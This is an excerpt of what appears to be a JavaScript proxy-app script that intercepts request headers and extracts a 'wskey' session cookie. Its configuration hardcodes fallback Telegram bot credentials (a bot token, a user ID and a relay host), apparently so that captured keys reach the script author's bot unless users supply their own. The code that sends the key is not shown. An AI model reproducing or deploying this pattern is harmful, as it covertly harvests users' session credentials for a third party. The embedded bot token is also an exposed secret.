...
!(async () => {
    if (isGetbody) {
        ...
        TG_BOT_TOKEN = ($.getdata('TG_BOT_TOKEN') || '1749668771:AAGbkdgqt3RiCvcB7uzwcW9UQ31w0-maN18');
        TG_USER_ID = ($.getdata('TG_USER_ID') || '887608610');
        TG_API_HOST = ($.getdata('TG_API_HOST') || 'tg.novl24.link');
...
async function GetWskey() {
    if (typeof $request.headers !== 'undefined'){
        ...
        const wskey = requestCookie.match(/wskey=.+?;/g);
        $.log(`[${$.name}] Wskey✅: 成功 \n'${wskey}'`);
